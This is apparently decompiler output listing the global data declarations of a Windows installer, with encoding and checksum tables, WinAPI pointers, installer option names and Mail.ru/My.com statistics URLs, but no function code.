char byte_4669D0[4] = { '\0', '\x01', '\0', '\0' }; // weak
wchar_t *off_4669D4 = L"ARP Job"; // weak
DWORD dword_4669D8[5] = { 3221225472u, 2147483648u, 1073741824u, 3221225472u, 3221225472u }; // weak
DWORD dwCreationDisposition[5] = { 2u, 3u, 3u, 3u, 4u }; // weak
int dword_466A00[5] = { 128, 128, 128, 128, -2147483520 }; // weak
DWORD dword_466A14[3] = { 1u, 0u, 3u }; // weak
HMODULE dword_466A20 = NULL; // idb
char byte_466A24 = '\0'; // weak
int (__stdcall *dword_466A28)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
DWORD dwCmpFlags[2] = { 0u, 1u }; // weak
int dword_466A38 = 0; // weak
char byte_466A3C[256] =
{
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\0',
  '\x01',
  '\x02',
  '\x03',
  '\x04',
  '\x05',
  '\x06',
  '\a',
  '\b',
  '\t',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\n',
  '\v',
  '\f',
  '\r',
  '\x0E',
  '\x0F',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\n',
  '\v',
  '\f',
  '\r',
  '\x0E',
  '\x0F',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80',
  '\x80'
}; // weak
wchar_t *off_466B3C = L"Start"; // weak
void *off_466B44 = (void *)0x42D1A8; // weak
wchar_t *off_466B4C = L"Detailed"; // weak
wchar_t *off_466B5C = L"Address"; // weak
wchar_t *off_466B6C = L"Address"; // weak
wchar_t *off_466B7C = L"Line numbers for"; // weak
HMODULE hLibModule = NULL; // idb
int (__stdcall *dword_466B84)(_DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_466B88)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int (*dword_466B8C)(void) = NULL; // weak
int (__stdcall *dword_466B90)(_DWORD) = NULL; // weak
int (__stdcall *dword_466B94)(_DWORD) = NULL; // weak
int (__stdcall *dword_466B98)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_466B9C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_466BA0)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_466BA4)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_466BA8 = 0; // weak
int (__stdcall *dword_466BAC)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_466BB0)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
char byte_466BB4 = '\0'; // weak
char byte_466BB5 = '\0'; // weak
int dword_466BB8 = 0; // idb
int dword_466BBC = 0; // weak
Idthreadcomponent::TIdThreadComponent *dword_466BC0 = NULL; // idb
int dword_466BD8 = 0; // weak
int dword_466BDC = 0; // weak
int dword_466BE0 = 0; // weak
char byte_466BE4 = '\0'; // weak
wchar_t *off_466BE8 = L"dd.MM.yyyy hh:mm:ss.zzz"; // weak
int *off_466BEC = &dword_432288; // weak
int dword_466BF0 = 0; // weak
wchar_t *off_466BF4 = L"Debug"; // weak
char byte_466C0C = '\0'; // weak
wchar_t *off_466C10 = L"amp"; // weak
_UNKNOWN unk_466C40; // weak
__int16 word_466C44[128] =
{
  8364,
  129,
  8218,
  131,
  8222,
  8230,
  8224,
  8225,
  136,
  8240,
  352,
  8249,
  346,
  356,
  381,
  377,
  144,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  152,
  8482,
  353,
  8250,
  347,
  357,
  382,
  378,
  160,
  711,
  728,
  321,
  164,
  260,
  166,
  167,
  168,
  169,
  350,
  171,
  172,
  173,
  174,
  379,
  176,
  177,
  731,
  322,
  180,
  181,
  182,
  183,
  184,
  261,
  351,
  187,
  317,
  733,
  318,
  380,
  340,
  193,
  194,
  258,
  196,
  313,
  262,
  199,
  268,
  201,
  280,
  203,
  282,
  205,
  206,
  270,
  272,
  323,
  327,
  211,
  212,
  336,
  214,
  215,
  344,
  366,
  218,
  368,
  220,
  221,
  354,
  223,
  341,
  225,
  226,
  259,
  228,
  314,
  263,
  231,
  269,
  233,
  281,
  235,
  283,
  237,
  238,
  271,
  273,
  324,
  328,
  243,
  244,
  337,
  246,
  247,
  345,
  367,
  250,
  369,
  252,
  253,
  355,
  729
}; // weak
__int16 word_466D44[128] =
{
  8364,
  129,
  8218,
  402,
  8222,
  8230,
  8224,
  8225,
  710,
  8240,
  352,
  8249,
  338,
  141,
  142,
  143,
  144,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  732,
  8482,
  353,
  8250,
  339,
  157,
  158,
  376,
  160,
  161,
  162,
  163,
  164,
  165,
  166,
  167,
  168,
  169,
  170,
  171,
  172,
  173,
  174,
  175,
  176,
  177,
  178,
  179,
  180,
  181,
  182,
  183,
  184,
  185,
  186,
  187,
  188,
  189,
  190,
  191,
  192,
  193,
  194,
  195,
  196,
  197,
  198,
  199,
  200,
  201,
  202,
  203,
  204,
  205,
  206,
  207,
  286,
  209,
  210,
  211,
  212,
  213,
  214,
  215,
  216,
  217,
  218,
  219,
  220,
  304,
  350,
  223,
  224,
  225,
  226,
  227,
  228,
  229,
  230,
  231,
  232,
  233,
  234,
  235,
  236,
  237,
  238,
  239,
  287,
  241,
  242,
  243,
  244,
  245,
  246,
  247,
  248,
  249,
  250,
  251,
  252,
  305,
  351,
  255
}; // weak
__int16 word_466E44[156] =
{
  1026,
  1027,
  8218,
  1107,
  8222,
  8230,
  8224,
  8225,
  8364,
  8240,
  1033,
  8249,
  1034,
  1036,
  1035,
  1039,
  1106,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  152,
  8482,
  1113,
  8250,
  1114,
  1116,
  1115,
  1119,
  160,
  1038,
  1118,
  1032,
  164,
  1168,
  166,
  167,
  1025,
  169,
  1028,
  171,
  172,
  173,
  174,
  1031,
  176,
  177,
  1030,
  1110,
  1169,
  181,
  182,
  183,
  1105,
  8470,
  1108,
  187,
  1112,
  1029,
  1109,
  1111,
  1040,
  1041,
  1042,
  1043,
  1044,
  1045,
  1046,
  1047,
  1048,
  1049,
  1050,
  1051,
  1052,
  1053,
  1054,
  1055,
  1056,
  1057,
  1058,
  1059,
  1060,
  1061,
  1062,
  1063,
  1064,
  1065,
  1066,
  1067,
  1068,
  1069,
  1070,
  1071,
  1072,
  1073,
  1074,
  1075,
  1076,
  1077,
  1078,
  1079,
  1080,
  1081,
  1082,
  1083,
  1084,
  1085,
  1086,
  1087,
  1088,
  1089,
  1090,
  1091,
  1092,
  1093,
  1094,
  1095,
  1096,
  1097,
  1098,
  1099,
  1100,
  1101,
  1102,
  1103,
  8364,
  129,
  8218,
  402,
  8222,
  8230,
  8224,
  8225,
  710,
  8240,
  352,
  8249,
  338,
  141,
  381,
  143,
  144,
  8216,
  8217,
  8220,
  8221,
  8226,
  8211,
  8212,
  732,
  8482,
  353,
  8250
}; // weak
int dword_466F7C[] = { 10289491 }; // weak
int dword_466F80[7] = { 24641918, 127, 2047, 65535, 2097151, 67108863, 2147483647 }; // weak
int dword_466F9C[256] =
{
  0,
  1996959894,
  -301047508,
  -1727442502,
  124634137,
  1886057615,
  -379345611,
  -1637575261,
  249268274,
  2044508324,
  -522852066,
  -1747789432,
  162941995,
  2125561021,
  -407360249,
  -1866523247,
  498536548,
  1789927666,
  -205950648,
  -2067906082,
  450548861,
  1843258603,
  -187386543,
  -2083289657,
  325883990,
  1684777152,
  -43845254,
  -1973040660,
  335633487,
  1661365465,
  -99664541,
  -1928851979,
  997073096,
  1281953886,
  -715111964,
  -1570279054,
  1006888145,
  1258607687,
  -770865667,
  -1526024853,
  901097722,
  1119000684,
  -608450090,
  -1396901568,
  853044451,
  1172266101,
  -589951537,
  -1412350631,
  651767980,
  1373503546,
  -925412992,
  -1076862698,
  565507253,
  1454621731,
  -809855591,
  -1195530993,
  671266974,
  1594198024,
  -972236366,
  -1324619484,
  795835527,
  1483230225,
  -1050600021,
  -1234817731,
  1994146192,
  31158534,
  -1731059524,
  -271249366,
  1907459465,
  112637215,
  -1614814043,
  -390540237,
  2013776290,
  251722036,
  -1777751922,
  -519137256,
  2137656763,
  141376813,
  -1855689577,
  -429695999,
  1802195444,
  476864866,
  -2056965928,
  -228458418,
  1812370925,
  453092731,
  -2113342271,
  -183516073,
  1706088902,
  314042704,
  -1950435094,
  -54949764,
  1658658271,
  366619977,
  -1932296973,
  -69972891,
  1303535960,
  984961486,
  -1547960204,
  -725929758,
  1256170817,
  1037604311,
  -1529756563,
  -740887301,
  1131014506,
  879679996,
  -1385723834,
  -631195440,
  1141124467,
  855842277,
  -1442165665,
  -586318647,
  1342533948,
  654459306,
  -1106571248,
  -921952122,
  1466479909,
  544179635,
  -1184443383,
  -832445281,
  1591671054,
  702138776,
  -1328506846,
  -942167884,
  1504918807,
  783551873,
  -1212326853,
  -1061524307,
  -306674912,
  -1698712650,
  62317068,
  1957810842,
  -355121351,
  -1647151185,
  81470997,
  1943803523,
  -480048366,
  -1805370492,
  225274430,
  2053790376,
  -468791541,
  -1828061283,
  167816743,
  2097651377,
  -267414716,
  -2029476910,
  503444072,
  1762050814,
  -144550051,
  -2140837941,
  426522225,
  1852507879,
  -19653770,
  -1982649376,
  282753626,
  1742555852,
  -105259153,
  -1900089351,
  397917763,
  1622183637,
  -690576408,
  -1580100738,
  953729732,
  1340076626,
  -776247311,
  -1497606297,
  1068828381,
  1219638859,
  -670225446,
  -1358292148,
  906185462,
  1090812512,
  -547295293,
  -1469587627,
  829329135,
  1181335161,
  -882789492,
  -1134132454,
  628085408,
  1382605366,
  -871598187,
  -1156888829,
  570562233,
  1426400815,
  -977650754,
  -1296233688,
  733239954,
  1555261956,
  -1026031705,
  -1244606671,
  752459403,
  1541320221,
  -1687895376,
  -328994266,
  1969922972,
  40735498,
  -1677130071,
  -351390145,
  1913087877,
  83908371,
  -1782625662,
  -491226604,
  2075208622,
  213261112,
  -1831694693,
  -438977011,
  2094854071,
  198958881,
  -2032938284,
  -237706686,
  1759359992,
  534414190,
  -2118248755,
  -155638181,
  1873836001,
  414664567,
  -2012718362,
  -15766928,
  1711684554,
  285281116,
  -1889165569,
  -127750551,
  1634467795,
  376229701,
  -1609899400,
  -686959890,
  1308918612,
  956543938,
  -1486412191,
  -799009033,
  1231636301,
  1047427035,
  -1362007478,
  -640263460,
  1088359270,
  936918000,
  -1447252397,
  -558129467,
  1202900863,
  817233897,
  -1111625188,
  -893730166,
  1404277552,
  615818150,
  -1160759803,
  -841546093,
  1423857449,
  601450431,
  -1285129682,
  -1000256840,
  1567103746,
  711928724,
  -1274298825,
  -1022587231,
  1510334235,
  755167117
}; // weak
int dword_46739C = 0; // weak
int dword_4673A0 = 0; // weak
int dword_4673A4 = 0; // weak
int dword_4673A8 = 0; // weak
_DWORD dword_4673AC = 0; // weak
_DWORD dword_4673B0 = 0; // weak
_DWORD dword_4673B4 = 0; // weak
_UNKNOWN unk_4673B8; // weak
int dword_4673F8 = 0; // weak
int dword_4673FC = 0; // weak
int dword_467400 = 0; // weak
_DWORD dword_467404[2] = { 0, 0 }; // weak
int dword_46740C = 0; // weak
void *off_467410 = &a00000000; // idb
void *off_467420 = &aD41d8cd98f00b2; // idb
void *off_467430 = &off_439E44; // idb
void *off_467440 = &aE3b0c44298fc1c; // idb
void *off_467450 = &off_43A504; // idb
Idthreadcomponent::TIdThreadComponent *dword_467460 = NULL; // idb
UINT uTimeout = 3000u; // idb
int dword_467468 = 0; // weak
int (__stdcall *dword_46746C)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
__int64 qword_467470 = 0i64; // weak
double dbl_467478 = -657434.0; // idb
double dbl_467480 = 2958465.99999; // idb
__int64 qword_467490 = 32535244799i64; // weak
double dbl_467498 = 0.0; // weak
double dbl_4674A0 = 0.0; // weak
double dbl_4674A8 = 0.0; // weak
double dbl_4674B0 = 0.0; // weak
wchar_t *off_467CCC = L"x86"; // weak
int dword_467CD4 = 0; // idb
int dword_467D34 = 0; // weak
int (**off_467D38[3])() =
{
  &cls_WinSecureUtil_TWinSecurityACE,
  &cls_WinSecureUtil_TWinSecurityACE,
  &cls_WinSecureUtil_TWinSecurityACE
}; // weak
char byte_467D8C = '\x03'; // weak
int dword_467D90 = 1245631; // weak
GUID pgActionID = { 11191659, -12988, 4560, "\x8C\xC2\xC0\x4F\u0095" }; // idb
_BYTE byte_467DE0[4] = { 1, 2, 3, 4 }; // weak
wchar_t *off_467E1C = L"FileName"; // weak
void *off_467E24 = &aHttp; // idb
void *off_467E28 = &aHttps; // idb
wchar_t *off_467E2C[4] =
{
  L"stat.gc.my.com/statroot",
  L"stat.dl.mail.ru/statroot",
  L"stat.gc.my.com/stat2.php?stand=1",
  L"stat.dl.mail.ru/stat2.php?stand=0"
}; // weak
wchar_t *off_467E30[3] =
{
  L"stat.dl.mail.ru/statroot",
  L"stat.gc.my.com/stat2.php?stand=1",
  L"stat.dl.mail.ru/stat2.php?stand=0"
}; // weak
void *off_467E34 = &aStatGcMyComSta_0; // idb
void *off_467E38 = &aStatDlMailRuSt_0; // idb
int (*off_467E3C)[2] = &dword_458198; // weak
__int64 qword_467E40 = 0i64; // weak
__int64 qword_467E48 = 0i64; // weak
char byte_467E50 = '\0'; // weak
DWORD cchLength = 4562700u; // idb
DWORD off_467E58 = 4562728u; // idb
wchar_t *off_467E5C[8] =
{
  L"DebugMode__",
  L"DMInit",
  L"SilentInstall",
  L"RepairBuild",
  L"Channel",
  L"Main",
  L"Lang",
  L"InstallerLang"
}; // weak
DWORD off_467E60 = 4562796u; // idb
wchar_t *off_467E64[6] =
{
  L"SilentInstall",
  L"RepairBuild",
  L"Channel",
  L"Main",
  L"Lang",
  L"InstallerLang"
}; // weak
wchar_t *off_467E68[5] = { L"RepairBuild", L"Channel", L"Main", L"Lang", L"InstallerLang" }; // weak
wchar_t *off_467E6C[4] = { L"Channel", L"Main", L"Lang", L"InstallerLang" }; // weak
DWORD off_467E70 = 4562928u; // idb
DWORD off_467E74 = 4562952u; // idb
wchar_t *off_467E78 = L"InstallerLang"; // weak
char byte_467E7C = '\0'; // weak
char byte_467E7D = '\0'; // weak
char byte_467E7E = '\0'; // weak
char byte_467E7F = '\0'; // weak
__int64 qword_467E80 = 367001600i64; // weak
char byte_467E88 = '\0'; // weak
char byte_467E89 = '\0'; // weak
int dword_467E8C = 0; // weak
int *off_467E90 = &dword_46671C; // weak
int off_467E98 = 4246064; // idb
int *off_467E9C = &dword_465000; // weak
int off_467EA0 = 4246160; // idb
int *off_467EA8 = &dword_466754; // weak
int *off_467EB8 = &dword_466714; // weak
int off_467EC0 = 4246916; // idb
int *off_467EC4 = &dword_466740; // weak
int off_467EC8 = 4246876; // idb
int *off_467ECC[2] = { &dword_4667DC, &dword_469038 }; // weak
int off_467ED4 = 4246216; // idb
void *off_467ED8 = &unk_465014; // weak
int off_467EDC = 4246892; // idb
int *off_467EE4[2] = { &dword_469010, &dword_4667D4 }; // weak
int *off_467EE8 = &dword_4667D4; // weak
void *off_467EF0 = &unk_466A2C; // weak
void *off_467EF8 = &unk_465024; // weak
void *off_467F00 = &unk_4666D0; // weak
int off_467F10 = 4246088; // idb
void *off_467F14 = &unk_466630; // weak
int *off_467F18 = &dword_466BF0; // weak
int *off_467F20 = &dword_466758; // weak
void *off_467F24 = &unk_4666B0; // weak
void *off_467F34 = &unk_46902C; // weak
int *off_467F38[2] = { &dword_4667C4, &dword_466708 }; // weak
int *off_467F3C = &dword_466708; // weak
void *off_467F40 = &unk_466680; // weak
char *off_467F44 = &byte_469055; // weak
int **off_467F4C[6] = { &off_40CA18, &off_40C968, &off_40CB70, &off_40C998, &off_40CA20, &off_40CB10 }; // weak
int off_467F60 = 4246288; // idb
int (***off_467F64)() = &off_465C94; // weak
int *off_467F6C = &dword_466734; // weak
int off_467F70 = 4246668; // idb
wchar_t **off_467F78 = &off_467CD8; // weak
void **off_467F7C = &unk_46933C; // idb
wchar_t **off_467F84 = &off_4674B8; // weak
void *off_467F88 = &unk_466640; // weak
int *off_467F8C = &dword_469014; // weak
int *off_467F98[2] = { &dword_46900C, &dword_469018 }; // weak
int *off_467F9C = &dword_469018; // weak
int *off_467FB0[2] = { &dword_4667D0, &dword_4667CC }; // weak
int *off_467FB4 = &dword_4667CC; // weak
int *off_467FBC = &dword_46673C; // weak
wchar_t **off_467FD0 = &off_467DE4; // weak
void *off_467FD4 = &unk_4667E4; // idb
int *off_467FD8 = &dword_466760; // weak
int off_467FE0 = 4246112; // idb
int *off_467FE8 = &dword_466718; // weak
void *off_467FF0 = &unk_466660; // weak
int **off_467FF4[3] = { &off_40CA58, &off_40CCD4, &off_40CCA4 }; // weak
int off_467FF8 = 4246740; // idb
int *off_468000 = &dword_4698F4; // weak
int off_468008 = 4246764; // idb
int off_46800C = 4246724; // idb
int off_468014 = 4246144; // idb
int off_46801C = 4246096; // idb
int off_468024 = 4246660; // idb
int off_468028 = 4246852; // idb
int *off_468030[2] = { &dword_46F698, &dword_46E8F0 }; // weak
int off_468038 = 4246748; // idb
int *off_46803C = &dword_466764; // weak
wchar_t **off_468040 = &off_467DA4; // weak
int *off_468044 = &dword_465010; // weak
int off_468048 = 4246136; // idb
int off_46804C = 4246828; // idb
void *off_468054 = &unk_4666E0; // weak
void *off_468058 = &unk_465DD8; // weak
int off_468068 = 4246684; // idb
int *off_46807C[2] = { &dword_469034, &dword_466768 }; // weak
int *off_468080 = &dword_466768; // weak
void *off_468084 = &unk_466670; // weak
void *off_468098 = &unk_466690; // weak
wchar_t **off_46809C = &off_4667F8; // weak
void *off_4680A4 = &unk_4666C0; // weak
int off_4680B0 = 4246868; // idb
void *off_4680B8 = &unk_469030; // weak
int off_4680C0 = 4246168; // idb
int **off_4680C4 = &off_4667F4; // weak
int *off_4680C8 = &dword_465018; // weak
int off_4680CC = 4246080; // idb
int off_4680D0 = 4245992; // idb
int off_4680D4 = 4246772; // idb
void *off_4680D8 = &unk_465020; // weak
int off_4680E0 = 4246304; // idb
void *off_4680EC = &unk_466650; // weak
int off_4680F0 = 4246224; // idb
int *off_4680F4[2] = { &dword_46676C, &dword_466784 }; // weak
int *off_4680F8 = &dword_466784; // weak
int off_4680FC = 4246836; // idb
int *off_468104[2] = { &dword_466738, &dword_46670C }; // weak
int *off_468108 = &dword_46670C; // weak
char *off_468114 = &byte_469054; // weak
int off_46811C = 4638360; // idb
int *off_468120[2] = { &dword_46675C, &dword_46E8F4 }; // weak
int off_468128 = 4246700; // idb
int off_46812C = 4246932; // idb
int off_468130 = 4246296; // idb
int *off_468134 = &dword_4667B0; // weak
int **off_468138 = &off_40C950; // weak
int *off_46813C[3] = { &dword_4667D8, &dword_46E8A0, &dword_466710 }; // weak
int *off_468144 = &dword_466710; // weak
int *off_46814C = &dword_4667E0; // weak
int off_468150 = 4246908; // idb
int off_468158 = 4246280; // idb
int *off_46815C = &dword_46503C; // weak
int off_468160 = 4246924; // idb
int off_468164 = 4246884; // idb
void *off_468170 = &unk_465CE8; // weak
int off_468174 = 4246716; // idb
int off_468178 = 4246900; // idb
int **off_468198 = &off_465E28; // weak
int *off_46819C = &dword_466770; // weak
void *off_4681A0 = &unk_4666A0; // weak
int off_4681A4 = 4246312; // idb
int off_4681A8 = 4246708; // idb
int (**off_4681B0)[10] = &off_4674E4; // weak
int off_4681B4 = 4246820; // idb
int off_4681B8 = 4246732; // idb
void *off_4681BC = &unk_4666F0; // weak
void *off_4681C4 = &unk_46501C; // weak
int **off_4681C8[2] = { &off_40CA10, &off_40C9E0 }; // weak
int *off_4681D0 = &dword_4667B4; // weak
char *off_4681D4 = &byte_465032; // weak
void *off_4681E0 = &unk_467DCC; // weak
int *off_4681E4 = &dword_465DC4; // weak
int off_4681E8 = 4246860; // idb
int off_4681EC = 4246844; // idb
int *off_4681F0[2] = { &dword_469058, &Locale }; // weak
int *off_4681F4 = &Locale; // weak
int off_4681FC = 4246072; // idb
void *off_468200 = &unk_46682C; // weak
int **off_468204[2] = { &off_40C948, &off_40CAF8 }; // weak
unsigned int dword_469000; // idb
int dword_469004; // weak
int dword_469008; // weak
int dword_46901C; // weak
int dword_469020; // weak
int dword_469024; // weak
int (__fastcall *dword_469028)(_DWORD); // weak
int dword_469034; // weak
int (*dword_469038)(void); // weak
int dword_469040; // weak
int dword_469048; // weak
int dword_46904C; // weak
_UNKNOWN unk_469050; // weak
char byte_469054; // weak
char byte_469055; // weak
char byte_469056; // weak
int dword_469058; // weak
int dword_46905C; // weak
_UNKNOWN unk_469060; // weak
__int16 word_469064; // weak
_UNKNOWN unk_46933C; // weak
__int16 word_469340; // weak
int dword_469348; // weak
int (__fastcall *dword_469358)(_DWORD); // weak
_UNKNOWN unk_469618; // weak
__int16 word_46961C; // weak
int dword_4698F4; // weak
int cchWideChar; // idb
int dword_46997C; // weak
int dword_469980; // weak
char byte_469985; // weak
int dword_469988; // weak
char byte_469AD2; // weak
int dword_469AD4; // weak
int dword_469AD8; // weak
char byte_469AE4; // weak
int dword_469AE8; // weak
int dword_469AEC; // weak
int dword_469AF0; // weak
int dword_469AF4[32]; // weak
_UNKNOWN unk_469B74; // weak
char byte_46BB74; // weak
int dword_46BB78; // weak
int dword_46BB7C; // weak
LPVOID lpAddress; // idb
char byte_46BB8C; // weak
_UNKNOWN unk_46BB94; // weak
int dword_46BB9C; // weak
int dword_46BBA0; // weak
const void *dword_46BBC4; // weak
int dword_46BBC8; // weak
int dword_46BBF0; // weak
int dword_46BBF4; // weak
char byte_46BBF8; // weak
BOOL (__stdcall *GetThreadPreferredUILanguages)(DWORD dwFlags, PULONG pulNumLanguages, PZZWSTR pwszLanguagesBuffer, PULONG pcchLanguagesBuffer);
BOOL (__stdcall *SetThreadPreferredUILanguages)(DWORD dwFlags, PCZZWSTR pwszLanguagesBuffer, PULONG pulNumLanguages);
int (*dword_46BC04)(void); // weak
char byte_46BC08; // weak
struct _RTL_CRITICAL_SECTION CriticalSection; // idb
__int16 word_46BC24; // weak
__int16 word_46BC26[85]; // weak
int dword_46BCD0[595]; // weak
char byte_46C61D; // weak
HMODULE hModule; // idb
int (__stdcall *dword_46C62C)(_DWORD, _DWORD); // weak
int (__stdcall *dword_46C630)(_DWORD, _DWORD); // weak
int dword_46C634; // weak
int dword_46C63C; // weak
int dword_46C640; // weak
HMODULE dword_46C644; // idb
int dword_46C650; // weak
_DWORD *dword_46C654; // weak
int dword_46C658; // weak
int dword_46C65C; // weak
int dword_46C660; // weak
int dword_46C664; // weak
int dword_46C668; // weak
int dword_46C66C; // weak
int dword_46C670; // weak
int dword_46C674; // weak
int dword_46C678; // weak
int (__fastcall *dword_46C67C)(_DWORD); // weak
int (__fastcall *dword_46C680)(_DWORD, _DWORD); // weak
int (__fastcall *dword_46C684)(_DWORD); // weak
LCID Locale; // idb
int dword_46C68C; // weak
int dword_46C690; // weak
char byte_46C694; // weak
_UNKNOWN unk_46C698; // weak
int dword_46C764; // weak
int dword_46C768; // weak
char byte_46C76C; // weak
int dword_46C770; // weak
int dword_46C774; // weak
int dword_46C778; // weak
_DWORD dword_46C77C; // weak
char byte_46C780; // weak
int dword_46C784; // weak
int dword_46C788; // weak
int dword_46C78C; // weak
int dword_46C790; // weak
int dword_46C794; // weak
int dword_46C798; // weak
int dword_46C79C; // weak
int dword_46C7A0; // weak
int dword_46C7A4; // weak
int dword_46C7A8; // weak
int dword_46C7AC; // weak
_UNKNOWN unk_46C7B0; // weak
_UNKNOWN unk_46C7B4; // weak
int dword_46C8B0; // weak
_UNKNOWN unk_46C8B4; // weak
_UNKNOWN unk_46D8A8; // weak
_DWORD dword_46E89C; // weak
int dword_46E8FC; // weak
int (__fastcall *dword_46E900)(_DWORD); // weak
int (__fastcall *dword_46E904)(_DWORD, _DWORD); // weak
int (__fastcall *dword_46E908)(_DWORD); // weak
int dword_46E90C; // weak
int dword_46E910; // weak
int dword_46E914; // weak
HMODULE dword_46E918[12]; // weak
int dword_46E948; // weak
int dword_46E950; // weak
int dword_46E954; // weak
int dword_46E958; // weak
int dword_46E95C; // weak
__int64 qword_46E960; // weak
__int64 qword_46E968; // weak
struct _OSVERSIONINFOW VersionInformation; // idb
struct _SYSTEM_INFO SystemInfo; // idb
_DWORD dword_46EAB0; // weak
int dword_46EAB4; // weak
_UNKNOWN unk_46EAB8; // weak
__int16 word_46EB7A; // weak
_UNKNOWN unk_46EB84; // weak
__int16 word_46EB86[]; // weak
WCHAR FileName; // idb
int dword_46ED94; // weak
int dword_46ED98; // weak
int dword_46ED9C; // weak
int dword_46EDA0; // weak
int dword_46EDA4; // weak
char byte_46EDA8; // weak
int dword_46EDAC; // weak
int (__stdcall *dword_46EDB0)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__fastcall *dword_46EDB4)(_DWORD, _DWORD); // weak
int dword_46EDB8; // weak
int dword_46EDBC; // weak
int dword_46EDC0; // weak
int dword_46EDC4; // weak
int dword_46EDC8; // weak
int dword_46EDCC; // weak
__int64 qword_46EDD0; // weak
TIME_ZONE_INFORMATION TimeZoneInformation; // idb
int dword_46EE84; // weak
int dword_46EE88; // weak
int dword_46EE8C; // weak
int dword_46EE90; // weak
int dword_46EE94; // weak
int dword_46EE98; // weak
int dword_46EE9C; // weak
int dword_46EEA4; // weak
int dword_46EEA8; // weak
char byte_46EEAC; // weak
_DWORD dword_46EEB0[506]; // weak
int dword_46F698; // weak
int dword_46F69C; // weak
int dword_46F6A0; // weak
int dword_46F6A4; // weak
int dword_46F6AC; // weak
char byte_46F6B0; // weak
int dword_46F6B4; // weak
int dword_46F6B8; // weak
int dword_46F6BC; // weak
int dword_46F6C0; // weak
int dword_46F6C4; // idb
char byte_46F6C8; // weak
int dword_46F6CC; // weak
int dword_46F6D0; // weak
int dword_46F6D4; // weak
char byte_46F6D8; // weak
void *dword_46F6DC; // idb
int dword_46F6E0; // weak
void *dword_46F6E4; // idb
void *dword_46F6E8; // idb
void *dword_46F6EC; // idb
int dword_46F6F0; // weak
char byte_46F6F4; // weak
char byte_46F6F5; // weak
char byte_46F6F6; // weak
void *dword_46F6F8; // idb
int dword_46F6FC; // weak
int kernel32_dll_import_table = 1; // weak
int user32_dll_import_table = 1; // weak
int dword_472040 = 1; // weak
// extern BOOL (__stdcall *GetLogicalProcessorInformation)(PSYSTEM_LOGICAL_PROCESSOR_INFORMATION Buffer, PDWORD ReturnedLength);
// extern int (__stdcall *MessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
// extern void (__stdcall *GetNativeSystemInfo)(LPSYSTEM_INFO lpSystemInfo);


//----- (00402F24) --------------------------------------------------------
